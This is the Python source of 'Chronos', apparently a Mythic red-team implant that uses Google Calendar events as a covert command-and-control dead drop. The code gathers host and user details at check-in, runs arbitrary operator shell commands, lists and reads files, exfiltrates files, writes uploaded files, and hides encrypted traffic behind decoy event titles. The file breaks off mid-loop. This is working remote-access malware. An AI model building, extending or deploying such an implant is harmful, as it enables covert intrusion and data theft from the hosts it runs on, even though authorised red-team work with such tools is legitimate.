#!/usr/bin/env python3
"""
Chronos — Mythic Agent with Google Calendar Dead Drop C2 (Protocol V2)

Communicates with the Epoch C2 profile via Google Calendar events.
Supports AES-256-CBC + HMAC-SHA256 encryption (Mythic AESPSK standard).
"""

import base64
import hashlib
import hmac
import json
import os
import platform
import random
import socket
import subprocess
import sys
import time
import uuid as uuid_lib
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Optional

from protocol_v2 import (
    EVENT_TITLES,
    MSG_CHECKIN,
    MSG_CMD,
    MSG_RESP,
    MSG_TASKING,
    PROTO_VERSION,
    SINGLE_EVENT_CAPACITY,
    pack_event_fields,
    sign_event_payload,
    unpack_event_fields,
    verify_event_sig,
)

# Google Calendar imports
try:
    from google.oauth2 import service_account
    from google.oauth2.credentials import Credentials
    from google_auth_oauthlib.flow import InstalledAppFlow
    from google.auth.transport.requests import Request
    from googleapiclient.discovery import build
    from googleapiclient.errors import HttpError
except ImportError:
    print("[!] Google Calendar libraries not found")
    sys.exit(1)

# Crypto imports — PyCryptodome for AES
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    HAS_CRYPTO = True
except ImportError:
    try:
        # Try pycryptodome alternate import
        from Cryptodome.Cipher import AES
        from Cryptodome.Util.Padding import pad, unpad
        HAS_CRYPTO = True
    except ImportError:
        HAS_CRYPTO = False

# ── Build-time Configuration ─────────────────────────────────────

PAYLOAD_UUID = "{{PAYLOAD_UUID}}"
CALENDAR_ID = "{{CALENDAR_ID}}"
CALLBACK_INTERVAL = {{CALLBACK_INTERVAL}}
CALLBACK_JITTER = {{CALLBACK_JITTER}}
GOOGLE_CREDENTIALS = '''{{GOOGLE_CREDENTIALS}}'''
AESPSK = "{{AESPSK}}"
EVENT_HMAC_KEY = "{{EVENT_HMAC_KEY}}"
KILL_DATE = "{{KILL_DATE}}"
DEBUG = "{{DEBUG}}"
FORCE_RESUME_ON_CHECKIN_FAIL = "{{FORCE_RESUME_ON_CHECKIN_FAIL}}"

# ── Protocol Constants (re-exported from protocol_v2 for template clarity) ──

SCOPES = ['https://www.googleapis.com/auth/calendar']


# ── AES-256-CBC + HMAC-SHA256 Encryption ─────────────────────────

class MythicCrypto:
    """Implements Mythic's standard AESPSK encryption.

    Wire format: base64(uuid_36_text + IV(16) + ciphertext + HMAC(32))
    - AES-256-CBC with PKCS7 padding
    - HMAC-SHA256 over (IV || ciphertext) using the same key
    """

    def __init__(self, psk_b64: str):
        # Check if PSK was substituted at build time (not still a template placeholder)
        _marker = "{" + "{AESPSK}" + "}"
        if psk_b64 and psk_b64 != _marker and psk_b64.strip():
            self.key = base64.b64decode(psk_b64)  # 32 bytes
            self.enabled = True
        else:
            self.key = None
            self.enabled = False

    def encrypt(self, plaintext: bytes) -> bytes:
        """Encrypt plaintext → IV + ciphertext + HMAC."""
        if not self.enabled:
            return plaintext

        iv = os.urandom(16)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        padded = pad(plaintext, AES.block_size)
        ciphertext = cipher.encrypt(padded)

        # HMAC over IV + ciphertext
        mac = hmac.new(self.key, iv + ciphertext, hashlib.sha256).digest()

        return iv + ciphertext + mac

    def decrypt(self, blob: bytes) -> bytes:
        """Decrypt IV + ciphertext + HMAC → plaintext."""
        if not self.enabled:
            return blob

        if len(blob) < 48:  # Minimum: 16 IV + 16 ciphertext + 16 partial? No — need 32 HMAC
            raise ValueError(f"Encrypted blob too short: {len(blob)} bytes")

        iv = blob[:16]
        mac_received = blob[-32:]
        ciphertext = blob[16:-32]

        # Verify HMAC
        mac_computed = hmac.new(self.key, iv + ciphertext, hashlib.sha256).digest()
        if not hmac.compare_digest(mac_received, mac_computed):
            raise ValueError("HMAC verification failed")

        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        padded = cipher.decrypt(ciphertext)
        return unpad(padded, AES.block_size)


# ── Agent ─────────────────────────────────────────────────────────

class ChronosClient:
    """Chronos — Uses Google Calendar for C2 (Protocol V2)"""

    def __init__(self):
        self.payload_uuid = PAYLOAD_UUID
        self.uuid = self._load_persisted_uuid() or PAYLOAD_UUID
        self.calendar_id = CALENDAR_ID
        self.poll_interval = CALLBACK_INTERVAL
        self.jitter = CALLBACK_JITTER
        self.service = None
        self.running = True
        self.crypto = MythicCrypto(AESPSK)
        self._debug = self._parse_debug()
        self.kill_date = self._parse_kill_date()
        self._event_hmac_key = self._parse_event_hmac_key()
        self._processed_messages: set = set()
        self._max_processed = 200

    def _get_state_path(self) -> Path:
        """Path for persisting agent state (callback UUID) across restarts."""
        home = Path.home()
        return home / f".chronos_{self.payload_uuid[:8]}"

    def _load_persisted_uuid(self) -> Optional[str]:
        """Load previously assigned callback UUID from disk.

        Only trust the saved UUID when payload_uuid in the state file matches
        this binary's baked-in PAYLOAD_UUID (avoids cross-payload reuse).
        """
        try:
            state_path = Path.home() / f".chronos_{PAYLOAD_UUID[:8]}"
            if state_path.exists():
                data = json.loads(state_path.read_text())
                saved_payload = data.get('payload_uuid', '')
                if saved_payload and saved_payload != PAYLOAD_UUID:
                    return None
                saved_uuid = data.get('callback_uuid', '')
                if (saved_uuid and len(saved_uuid) == 36
                        and saved_uuid != PAYLOAD_UUID):
                    return saved_uuid
        except Exception:
            pass
        return None

    def _persist_uuid(self):
        """Save the current callback UUID to disk for reuse after restart."""
        try:
            state_path = self._get_state_path()
            state_path.write_text(json.dumps({
                'callback_uuid': self.uuid,
                'payload_uuid': self.payload_uuid,
            }))
            os.chmod(state_path, 0o600)
        except Exception:
            pass

    def _parse_event_hmac_key(self) -> Optional[bytes]:
        """Load the event HMAC key baked in at build time."""
        _marker = "{" + "{EVENT_HMAC_KEY}" + "}"
        if EVENT_HMAC_KEY == _marker or not EVENT_HMAC_KEY:
            return None
        try:
            return base64.b64decode(EVENT_HMAC_KEY)
        except Exception:
            return None

    def _parse_force_resume(self) -> bool:
        """Allow continuing after check-in failure (lab/debug only)."""
        env_flag = os.environ.get('CHRONOS_FORCE_RESUME', '').lower()
        if env_flag in ('1', 'true', 'yes'):
            return True
        _marker = "{" + "{FORCE_RESUME_ON_CHECKIN_FAIL}" + "}"
        if FORCE_RESUME_ON_CHECKIN_FAIL == _marker:
            return False
        return FORCE_RESUME_ON_CHECKIN_FAIL.lower() in ('true', '1', 'yes')

    def _sign_event(self, description: str, location: str = '',
                    ext_chunks: Optional[dict] = None) -> str:
        return sign_event_payload(
            self._event_hmac_key, description, location, ext_chunks or {})

    def _verify_event_sig(self, event: dict) -> bool:
        return verify_event_sig(event, self._event_hmac_key)

    def _parse_debug(self) -> bool:
        _marker = "{" + "{DEBUG}" + "}"
        if DEBUG == _marker or not DEBUG:
            return False
        return DEBUG.lower() in ('true', '1', 'yes')

    def _parse_kill_date(self) -> Optional[datetime]:
        _marker = "{" + "{KILL_DATE}" + "}"
        if KILL_DATE == _marker or not KILL_DATE or KILL_DATE == "":
            return None
        try:
            # Mythic Date parameter format: YYYY-MM-DD
            dt = datetime.strptime(KILL_DATE, "%Y-%m-%d")
            return dt.replace(tzinfo=timezone.utc)
        except ValueError:
            return None

    def _check_kill_date(self) -> bool:
        """Returns True if the kill date has passed and agent should stop."""
        if self.kill_date is None:
            return False
        return datetime.now(timezone.utc) >= self.kill_date

    def _log(self, msg: str):
        if self._debug:
            print(f"[Chronos] {msg}", flush=True)

    # ── Google Auth ────────────────────────────────────────────

    def authenticate(self) -> bool:
        creds = None

        if not GOOGLE_CREDENTIALS or GOOGLE_CREDENTIALS == '{}':
            return False

        try:
            creds_json = base64.b64decode(GOOGLE_CREDENTIALS).decode('utf-8')
            creds_dict = json.loads(creds_json)
        except Exception:
            return False

        if creds_dict.get('type') == 'service_account':
            try:
                creds = service_account.Credentials.from_service_account_info(
                    creds_dict, scopes=SCOPES)
            except Exception:
                return False
        elif 'installed' in creds_dict or 'web' in creds_dict:
            try:
                flow = InstalledAppFlow.from_client_config(creds_dict, SCOPES)
                creds = flow.run_local_server(port=0)
            except Exception:
                return False
        else:
            return False

        self.service = build('calendar', 'v3', credentials=creds)
        return True

    # ── Mythic Message Encoding ────────────────────────────────

    def encode_message(self, payload: dict) -> str:
        """Encode a Mythic message: base64(uuid_36 + encrypt(json))."""
        raw_json = json.dumps(payload).encode('utf-8')
        encrypted = self.crypto.encrypt(raw_json)
        # Prepend 36-char text UUID
        message = self.uuid.encode('utf-8') + encrypted
        return base64.b64encode(message).decode('utf-8')

    def decode_message(self, b64_data: str) -> dict:
        """Decode a Mythic message: base64 → strip uuid → decrypt → JSON."""
        raw = base64.b64decode(b64_data)
        # First 36 bytes are text UUID
        uuid_text = raw[:36].decode('utf-8')
        encrypted = raw[36:]
        plaintext = self.crypto.decrypt(encrypted)
        return json.loads(plaintext.decode('utf-8'))

    # ── Calendar Helpers ───────────────────────────────────────

    def _utcnow(self) -> datetime:
        return datetime.now(timezone.utc)

    def _random_title(self) -> str:
        return random.choice(EVENT_TITLES)

    def _create_event_raw(self, msg_type: str, description: str,
                          location: str, ext_chunks: dict,
                          message_id: str, seq: int = 0,
                          total: int = 1) -> Optional[str]:
        """Create a single V2 calendar event with packed fields."""
        try:
            now = self._utcnow()
            props = {
                'proto_version': PROTO_VERSION,
                'msg_type': msg_type,
                'agent_id': self.uuid,
                'message_id': message_id,
                'seq': str(seq),
                'total': str(total),
            }
            sig = self._sign_event(description, location, ext_chunks)
            if sig:
                props['event_sig'] = sig
            props.update(ext_chunks)

            event = {
                'summary': self._random_title(),
                'description': description,
                'location': location,
                'start': {
                    'dateTime': (now + timedelta(minutes=30)).isoformat(),
                    'timeZone': 'UTC',
                },
                'end': {
                    'dateTime': (now + timedelta(minutes=90)).isoformat(),
                    'timeZone': 'UTC',
                },
                'extendedProperties': {'private': props},
                'reminders': {'useDefault': False, 'overrides': []},
            }

            created = self.service.events().insert(
                calendarId=self.calendar_id, body=event
            ).execute()
            return created['id']
        except HttpError as e:
            self._log(f"HttpError creating {msg_type} event: {e}")
            return None

    def _create_event(self, msg_type: str, data: str,
                      message_id: str = None) -> Optional[str]:
        """Create calendar event(s) with automatic chunking."""
        if not message_id:
            message_id = str(uuid_lib.uuid4())

        if len(data) <= SINGLE_EVENT_CAPACITY:
            desc, loc, ext_chunks = pack_event_fields(data)
            return self._create_event_raw(
                msg_type, desc, loc, ext_chunks, message_id)

        # Multi-event chunking
        chunks = []
        remaining = data
        while remaining:
            chunk = remaining[:SINGLE_EVENT_CAPACITY]
            chunks.append(chunk)
            remaining = remaining[SINGLE_EVENT_CAPACITY:]

        total = len(chunks)
        first_id = None
        for seq, chunk in enumerate(chunks):
            desc, loc, ext_chunks = pack_event_fields(chunk)
            eid = self._create_event_raw(
                msg_type, desc, loc, ext_chunks,
                message_id, seq=seq, total=total)
            if seq == 0:
                first_id = eid

        return first_id

    def _find_events(self, msg_type: str) -> list:
        """Find V2 events for this agent by msg_type."""
        try:
            now = self._utcnow()
            time_min = (now - timedelta(minutes=30)).isoformat()
            time_max = (now + timedelta(hours=4)).isoformat()

            events_result = self.service.events().list(
                calendarId=self.calendar_id,
                timeMin=time_min,
                timeMax=time_max,
                singleEvents=True,
                orderBy='startTime',
                privateExtendedProperty=[
                    f'proto_version={PROTO_VERSION}',
                    f'msg_type={msg_type}',
                    f'agent_id={self.uuid}',
                ],
            ).execute()
            return events_result.get('items', [])
        except HttpError:
            return []

    def _delete_event(self, event_id: str):
        try:
            self.service.events().delete(
                calendarId=self.calendar_id, eventId=event_id
            ).execute()
        except HttpError as e:
            # 410/404 are expected — event already deleted by server
            if hasattr(e, 'resp') and e.resp.status in (410, 404):
                pass
            else:
                self._log(f"Error deleting event {event_id}: {e}")

    # ── System Info ────────────────────────────────────────────

    def get_system_info(self) -> dict:
        ip = "unknown"
        try:
            ip = socket.gethostbyname(socket.gethostname())
        except Exception:
            pass

        return {
            'hostname': platform.node(),
            'user': os.getenv('USER') or os.getenv('USERNAME') or 'unknown',
            'os': platform.system(),
            'architecture': platform.machine(),
            'pid': os.getpid(),
            'ip': ip,
        }

    # ── Checkin ────────────────────────────────────────────────

    def _checkin_wait_times(self) -> list:
        """Progressive wait schedule totaling max(240, poll_interval * 12) seconds."""
        try:
            interval = int(CALLBACK_INTERVAL)
        except (TypeError, ValueError):
            interval = 20
        total = max(240, interval * 12)
        waits = [3, 3, 5, 5, 5, 10, 10, 10]
        elapsed = sum(waits)
        while elapsed < total:
            w = min(15, total - elapsed)
            if w <= 0:
                break
            waits.append(w)
            elapsed += w
        return waits

    def checkin(self) -> bool:
        """Send initial checkin, wait for callback ID from Mythic.

        Resume path: if a valid persisted callback UUID exists for this payload,
        reuse it and skip a payload-UUID checkin (which would mint a new Mythic
        callback). Tasking in the main loop refreshes "last checkin" activity.
        Cold start (no state file): full checkin as before.
        """
        original_uuid = self.uuid
        had_persisted = original_uuid != self.payload_uuid

        # Resume: same payload restart — do not mint a new Mythic callback.
        if had_persisted:
            self._log(
                f"Resuming with persisted callback UUID: {original_uuid[:8]}... "
                f"(skipping new checkin; clear ~/.chronos_* for a cold start)"
            )
            self.uuid = original_uuid
            return True

        sys_info = self.get_system_info()

        # Cold start: encode checkin with payload_uuid so Mythic can match
        # the registered payload and issue a new callback ID.
        self.uuid = self.payload_uuid

        checkin_data = {
            'action': 'checkin',
            'uuid': self.payload_uuid,
            'ips': [sys_info['ip']],
            'os': sys_info['os'],
            'user': sys_info['user'],
            'host': sys_info['hostname'],
            'pid': sys_info['pid'],
            'architecture': sys_info['architecture'],
            'domain': '',
            'integrity_level': 2,
            'external_ip': '',
            'encryption_key': '',
            'decryption_key': '',
        }

        encoded = self.encode_message(checkin_data)
        t0 = time.time()
        self._log(f"checkin_insert_ts={t0:.3f}")
        event_id = self._create_event(MSG_CHECKIN, encoded)
        if not event_id:
            self.uuid = original_uuid
            return False
        self._log(f"Checkin event created id={event_id[:12]}...")

        # Poll for Mythic's checkin response with progressive backoff.
        # Window scales with CALLBACK_INTERVAL to cover Calendar visibility lag.
        wait_times = self._checkin_wait_times()
        self._log(f"Checkin wait budget={sum(wait_times)}s ({len(wait_times)} polls)")
        for attempt, wait in enumerate(wait_times, start=1):
            time.sleep(wait)
            elapsed = time.time() - t0
            self._log(f"Checkin poll attempt={attempt}/{len(wait_times)} elapsed={elapsed:.1f}s")
            cmd_events = self._find_events(MSG_CMD)
            for event in cmd_events:
                props = event.get('extendedProperties', {}).get('private', {})
                message_id = props.get('message_id', '')
                if message_id and message_id in self._processed_messages:
                    continue
                if not self._verify_event_sig(event):
                    continue
                data = unpack_event_fields(event)
                if not data:
                    continue
                try:
                    response = self.decode_message(data)
                    if response.get('action') == 'checkin' and response.get('id'):
                        new_id = response['id']
                        latency = time.time() - t0
                        self._log(f"Got callback ID: {new_id[:8]}... latency={latency:.1f}s")
                        self.uuid = new_id
                        self._persist_uuid()
                        if message_id:
                            self._mark_processed(message_id)
                        self._delete_event(event['id'])
                        return True
                except Exception:
                    continue

        self._log(
            f"WARNING: Checkin response not received after {time.time() - t0:.1f}s "
            f"(first-run; not treating payload UUID as success)"
        )
        return False

    # ── Tasking ────────────────────────────────────────────────

    def request_tasking(self) -> Optional[str]:
        """Send get_tasking request, return event ID."""
        tasking = {
            'action': 'get_tasking',
            'tasking_size': -1,
        }
        encoded = self.encode_message(tasking)
        return self._create_event(MSG_TASKING, encoded)

    def _mark_processed(self, message_id: str):
        """Record a message_id as processed to prevent duplicate execution."""
        self._processed_messages.add(message_id)
        # Evict oldest entries if set grows too large
        if len(self._processed_messages) > self._max_processed:
            # Remove roughly half — order doesn't matter, just cap growth
            to_remove = list(self._processed_messages)[:self._max_processed // 2]
            for mid in to_remove:
                self._processed_messages.discard(mid)

    def poll_for_tasks(self) -> list:
        """Poll calendar for cmd events containing tasks.

        Handles both single-event and multi-event chunked commands.
        Skips events whose message_id was already processed (dedup).
        """
        cmd_events = self._find_events(MSG_CMD)
        tasks = []
        chunked = {}  # message_id -> {total, chunks: {seq: data}, event_ids}

        for event in cmd_events:
            if not self._verify_event_sig(event):
                self._delete_event(event['id'])
                continue

            props = event.get('extendedProperties', {}).get('private', {})
            message_id = props.get('message_id', '')
            seq = int(props.get('seq', '0'))
            total = int(props.get('total', '1'))

            if message_id in self._processed_messages:
                self._log(f"Skipping already-processed message {message_id[:8]}")
                self._delete_event(event['id'])
                continue

            data = unpack_event_fields(event)
            if not data:
                self._delete_event(event['id'])
                continue

            if total == 1:
                # Single event
                try:
                    parsed = self.decode_message(data)
                    tasks.append({
                        'event_ids': [event['id']],
                        'message_id': message_id,
                        'parsed': parsed,
                    })
                except Exception:
                    continue
            else:
                # Multi-event chunk
                if message_id not in chunked:
                    chunked[message_id] = {'total': total, 'chunks': {}, 'event_ids': []}
                chunked[message_id]['chunks'][seq] = data
                chunked[message_id]['event_ids'].append(event['id'])

        # Reassemble complete chunked messages
        for mid, info in chunked.items():
            if len(info['chunks']) == info['total']:
                full_data = ''.join(info['chunks'][i] for i in range(info['total']))
                try:
                    parsed = self.decode_message(full_data)
                    tasks.append({
                        'event_ids': info['event_ids'],
                        'message_id': mid,
                        'parsed': parsed,
                    })
                except Exception:
                    continue

        return tasks

    # ── Command Execution ──────────────────────────────────────

    def execute_tasks(self, task_data: dict) -> Optional[str]:
        """Execute tasks from a get_tasking response, return post_response JSON."""
        action = task_data.get('action', '')

        if action != 'get_tasking':
            return None

        tasks = task_data.get('tasks', [])
        if not tasks:
            return None

        # Command dispatch table
        dispatch = {
            'shell': self._cmd_shell,
            'pwd': self._cmd_pwd,
            'exit': self._cmd_exit,
            'ls': self._cmd_ls,
            'cat': self._cmd_cat,
            'cd': self._cmd_cd,
            'whoami': self._cmd_whoami,
            'ps': self._cmd_ps,
            'download': self._cmd_download,
            'upload': self._cmd_upload,
        }

        responses = []
        for task in tasks:
            command = task.get('command', '')
            task_id = task.get('id', 'unknown')
            parameters = task.get('parameters', '')

            handler = dispatch.get(command)
            if handler:
                responses.append(handler(task_id, parameters))
            else:
                responses.append({
                    'task_id': task_id,
                    'user_output': f'Unknown command: {command}',
                    'completed': True,
                    'status': 'error',
                })

        if responses:
            return json.dumps({
                'action': 'post_response',
                'responses': responses,
            })
        return None

    def _extract_param(self, parameters: str, key: str) -> str:
        """Extract a parameter value from JSON or raw string."""
        if not parameters:
            return ''
        try:
            params = json.loads(parameters)
            if isinstance(params, dict):
                val = params.get(key, '')
                if isinstance(val, str) and val.startswith('{'):
                    try:
                        inner = json.loads(val)
                        return inner.get(key, val)
                    except (json.JSONDecodeError, ValueError):
                        pass
                return str(val) if val else ''
        except (json.JSONDecodeError, ValueError):
            pass
        return parameters

    def _cmd_shell(self, task_id: str, parameters: str) -> dict:
        actual_cmd = self._extract_param(parameters, 'command')
        if not actual_cmd:
            return {
                'task_id': task_id,
                'user_output': 'No command provided',
                'completed': True,
                'status': 'error',
            }
        try:
            result = subprocess.run(
                actual_cmd, shell=True,
                capture_output=True, text=True, timeout=300
            )
            output = result.stdout
            if result.stderr:
                output += f"\n{result.stderr}" if output else result.stderr
            return {
                'task_id': task_id,
                'user_output': output,
                'completed': True,
                'status': 'success' if result.returncode == 0 else 'error',
            }
        except subprocess.TimeoutExpired:
            return {
                'task_id': task_id,
                'user_output': 'Command timed out (300s)',
                'completed': True,
                'status': 'error',
            }
        except Exception as e:
            return {
                'task_id': task_id,
                'user_output': str(e),
                'completed': True,
                'status': 'error',
            }

    def _cmd_pwd(self, task_id: str, parameters: str = '') -> dict:
        return {
            'task_id': task_id,
            'user_output': os.getcwd(),
            'completed': True,
            'status': 'success',
        }

    def _cmd_exit(self, task_id: str, parameters: str = '') -> dict:
        self.running = False
        return {
            'task_id': task_id,
            'user_output': 'Agent exiting',
            'completed': True,
            'status': 'success',
        }

    def _cmd_ls(self, task_id: str, parameters: str) -> dict:
        path = self._extract_param(parameters, 'path') or '.'
        try:
            # ls is a structured file browser command — it takes a path only.
            # For flags like -la, operators should use: shell ls -la
            if path == '.':
                file_path = os.getcwd()
            elif os.path.isabs(path):
                file_path = path
            else:
                file_path = os.path.join(os.getcwd(), path)
            file_path = os.path.realpath(file_path)

            stat_info = os.stat(file_path)
            target_is_file = os.path.isfile(file_path)
            target_name = os.path.basename(file_path.rstrip(os.sep)) or os.sep

            file_browser = {
                'host': platform.node(),
                'is_file': target_is_file,
                'permissions': {'octal': oct(stat_info.st_mode)[-3:]},
                'name': target_name if target_name not in ('.', '') else os.path.basename(os.getcwd()),
                'parent_path': os.path.dirname(file_path),
                'success': True,
                'access_time': int(stat_info.st_atime * 1000),
                'modify_time': int(stat_info.st_mtime * 1000),
                'size': stat_info.st_size,
                'update_deleted': True,
                'files': [],
            }

            if not target_is_file:
                for entry in os.scandir(file_path):
                    f = {'name': entry.name, 'is_file': entry.is_file()}
                    try:
                        s = entry.stat()
                        f['permissions'] = {'octal': oct(s.st_mode)[-3:]}
                        f['access_time'] = int(s.st_atime * 1000)
                        f['modify_time'] = int(s.st_mtime * 1000)
                        f['size'] = s.st_size
                    except OSError:
                        pass
                    file_browser['files'].append(f)

            lines = [f"{'Type':<5s} {'Perms':<6s} {'Size':>10s}  Name"]
            lines.append("-" * 45)
            for f in sorted(file_browser['files'], key=lambda x: (x['is_file'], x['name'])):
                ftype = '-' if f['is_file'] else 'd'
                perms = f.get('permissions', {}).get('octal', '???')
                size = str(f.get('size', '?'))
                lines.append(f"{ftype:<5s} {perms:<6s} {size:>10s}  {f['name']}")

            return {
                'task_id': task_id,
                'file_browser': file_browser,
                'user_output': f"{file_path}\n" + "\n".join(lines),
                'completed': True,
                'status': 'success',
            }
        except Exception as e:
            return {'task_id': task_id, 'user_output': str(e),
                    'completed': True, 'status': 'error'}

    def _cmd_cat(self, task_id: str, parameters: str) -> dict:
        path = self._extract_param(parameters, 'path')
        if not path:
            return {'task_id': task_id, 'user_output': 'No file path provided',
                    'completed': True, 'status': 'error'}
        try:
            target = Path(path).expanduser().resolve()
            if not target.exists():
                return {'task_id': task_id, 'user_output': f'File not found: {path}',
                        'completed': True, 'status': 'error'}
            if target.is_dir():
                return {'task_id': task_id, 'user_output': f'Is a directory: {path}',
                        'completed': True, 'status': 'error'}
            content = target.read_text(errors='replace')
            return {'task_id': task_id, 'user_output': content,
                    'completed': True, 'status': 'success'}
        except Exception as e:
            return {'task_id': task_id, 'user_output': str(e),
                    'completed': True, 'status': 'error'}

    def _cmd_cd(self, task_id: str, parameters: str) -> dict:
        path = self._extract_param(parameters, 'path')
        if not path:
            return {'task_id': task_id, 'user_output': 'No directory provided',
                    'completed': True, 'status': 'error'}
        try:
            target = Path(path).expanduser().resolve()
            os.chdir(target)
            return {'task_id': task_id, 'user_output': str(target),
                    'completed': True, 'status': 'success'}
        except Exception as e:
            return {'task_id': task_id, 'user_output': str(e),
                    'completed': True, 'status': 'error'}

    def _cmd_whoami(self, task_id: str, parameters: str = '') -> dict:
        info = self.get_system_info()
        output = f"User: {info['user']}\n"
        output += f"Host: {info['hostname']}\n"
        output += f"OS: {info['os']} {info['architecture']}\n"
        output += f"PID: {info['pid']}\n"
        output += f"IP: {info['ip']}\n"
        output += f"CWD: {os.getcwd()}"
        return {'task_id': task_id, 'user_output': output,
                'completed': True, 'status': 'success'}

    def _cmd_ps(self, task_id: str, parameters: str = '') -> dict:
        try:
            if platform.system() == 'Windows':
                result = subprocess.run(
                    ['tasklist'], capture_output=True, text=True, timeout=30)
            else:
                result = subprocess.run(
                    ['ps', 'aux'], capture_output=True, text=True, timeout=30)
            return {'task_id': task_id, 'user_output': result.stdout,
                    'completed': True, 'status': 'success'}
        except Exception as e:
            return {'task_id': task_id, 'user_output': str(e),
                    'completed': True, 'status': 'error'}

    def _cmd_download(self, task_id: str, parameters: str) -> dict:
        MAX_SIZE = 512000  # ~500KB limit for Calendar-based transfer
        path = self._extract_param(parameters, 'path')
        if not path:
            return {'task_id': task_id, 'user_output': 'No file path provided',
                    'completed': True, 'status': 'error'}
        try:
            target = Path(path).expanduser().resolve()
            if not target.exists():
                return {'task_id': task_id, 'user_output': f'File not found: {path}',
                        'completed': True, 'status': 'error'}
            if target.is_dir():
                return {'task_id': task_id, 'user_output': f'Is a directory: {path}',
                        'completed': True, 'status': 'error'}

            file_size = target.stat().st_size
            if file_size > MAX_SIZE:
                return {'task_id': task_id,
                        'user_output': (
                            f'File too large for Calendar C2: {file_size} bytes '
                            f'(max {MAX_SIZE} / ~500KB). download only supports '
                            f'small single-shot transfers; large files are not supported.'
                        ),
                        'completed': True, 'status': 'error'}

            file_data = target.read_bytes()
            file_b64 = base64.b64encode(file_data).decode('ascii')

            return {
                'task_id': task_id,
                'user_output': f'Downloaded {target.name} ({file_size} bytes)',
                'completed': True,
                'status': 'success',
                'download': {
                    'total_chunks': 1,
                    'chunk_num': 1,
                    'chunk_data': file_b64,
                    'full_path': str(target),
                    'filename': target.name,
                    'is_screenshot': False,
                },
            }
        except Exception as e:
            return {'task_id': task_id, 'user_output': str(e),
                    'completed': True, 'status': 'error'}

    def _cmd_upload(self, task_id: str, parameters: str) -> dict:
        MAX_SIZE = 512000  # ~500KB limit for Calendar-based transfer
        try:
            params = json.loads(parameters) if isinstance(parameters, str) else parameters
            file_b64 = params.get('file', '')
            remote_path = params.get('remote_path', '.')
            filename = params.get('filename') or 'uploaded_file'

            if not file_b64:
                return {'task_id': task_id, 'user_output': 'No file data provided',
                        'completed': True, 'status': 'error'}

            # Mythic File params are UUIDs until create_go_tasking inlines base64.
            # A bare UUID here means the payload-type upload command was not updated.
            if (isinstance(file_b64, str)
                    and len(file_b64) == 36
                    and file_b64.count('-') == 4
                    and all(c in '0123456789abcdef-' for c in file_b64.lower())):
                return {
                    'task_id': task_id,
                    'user_output': (
                        'Upload received a Mythic file UUID instead of file bytes. '
                        'Restart/reinstall the Chronos payload type so upload inlines '
                        'file contents (Calendar C2 does not support chunked upload).'
                    ),
                    'completed': True,
                    'status': 'error',
                }

            file_data = base64.b64decode(file_b64)
            if len(file_data) > MAX_SIZE:
                return {
                    'task_id': task_id,
                    'user_output': (
                        f'File too large for Calendar C2: {len(file_data)} bytes '
                        f'(max {MAX_SIZE} / ~500KB). Large uploads are not supported.'
                    ),
                    'completed': True,
                    'status': 'error',
                }

            target = Path(remote_path).expanduser().resolve()
            if target.is_dir():
                target = target / Path(filename).name

            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_bytes(file_data)
            return {
                'task_id': task_id,
                'user_output': f'Uploaded {len(file_data)} bytes to {target}',
                'completed': True,
                'status': 'success',
            }
        except Exception as e:
            return {'task_id': task_id, 'user_output': str(e),
                    'completed': True, 'status': 'error'}

    # ── Response Sending ───────────────────────────────────────

    def send_and_receive(self, payload: dict) -> Optional[dict]:
        """Send a post_response and wait for Mythic's reply via Calendar.

        Used for multi-round protocols like chunked file download/upload
        where the agent needs Mythic's acknowledgment (file_id, chunk_data).
        Returns the decoded reply dict, or None on failure.
        """
        response_json = json.dumps(payload)
        encoded = self.encode_message(payload)

        for attempt in range(3):
            event_id = self._create_event(MSG_RESP, encoded)
            if event_id:
                break
            time.sleep(2 * (attempt + 1))
        else:
            return None

        # Wait for the server to relay Mythic's reply as a cmd event
        for _ in range(12):
            time.sleep(5)
            cmd_events = self._find_events(MSG_CMD)
            for event in cmd_events:
                if not self._verify_event_sig(event):
                    continue
                data = unpack_event_fields(event)
                if not data:
                    continue
                try:
                    reply = self.decode_message(data)
                    self._delete_event(event['id'])
                    return reply
                except Exception:
                    continue
        return None

    def send_response(self, response_json: str, max_retries: int = 3) -> bool:
        """Encode and send a post_response as a resp event, with retries."""
        try:
            payload = json.loads(response_json)
            self._log(f"Sending response ({len(response_json)} bytes)")
            encoded = self.encode_message(payload)

            for attempt in range(max_retries):
                event_id = self._create_event(MSG_RESP, encoded)
                if event_id:
                    self._log(f"Response event created: {event_id}")
                    return True
                self._log(f"Retry {attempt + 1}/{max_retries} creating response event...")
                time.sleep(2 * (attempt + 1))

            self._log("Failed to create response event after retries")
            return False
        except Exception as e:
            self._log(f"Error sending response: {e}")
            return False

    # ── Main Loop ──────────────────────────────────────────────

    def run(self):
        # Check kill date before starting
        if self._check_kill_date():
            self._log("Kill date reached, not starting")
            return

        self._log("Authenticating...")
        if not self.authenticate():
            self._log("Authentication failed")
            sys.exit(1)
        self._log("Authenticated")

        self._log("Checking in (may take up to ~4 minutes on first run)...")
        checkin_ok = self.checkin()
        if checkin_ok:
            self._log(f"Checked in, UUID: {self.uuid[:8]}...")
        elif self._parse_force_resume():
            self._log(
                f"Checkin FAILED — continuing with payload UUID {self.uuid[:8]}... "
                f"(force-resume enabled; tasking may fail until a successful checkin)"
            )
        else:
            self._log(
                "Checkin FAILED — no callback ID received. "
                "Exiting (set CHRONOS_FORCE_RESUME=1 or rebuild with "
                "force_resume_on_checkin_fail for lab continue-on-fail)."
            )
            sys.exit(1)

        while self.running:
            try:
                # Check kill date each loop
                if self._check_kill_date():
                    self._log("Kill date reached, shutting down")
                    self.running = False
                    break

                # First, check if there are already cmd events waiting from a
                # previous cycle (the server may have created them while we slept).
                task_events = self.poll_for_tasks()
                if task_events:
                    self._log(f"Found {len(task_events)} waiting task(s)")
                else:
                    # No waiting tasks — request new tasking and poll with retries.
                    # The server polls every ~15s, so we give it up to 30s to see
                    # our tasking event, forward to Mythic, and create a cmd event.
                    self._log("Requesting tasking...")
                    self.request_tasking()

                    for poll_attempt in range(6):
                        time.sleep(5)
                        if not self.running:
                            break
                        task_events = self.poll_for_tasks()
                        if task_events:
                            self._log(f"Got {len(task_events)} task(s)")
                            break

                for task_event in task_events:
                    parsed = task_event['parsed']
                    msg_id = task_event.get('message_id', '')
                    action = parsed.get('action', '?')
                    tasks_in = parsed.get('tasks', [])
                    self._log(f"Processing event: action={action}, tasks={len(tasks_in)}")
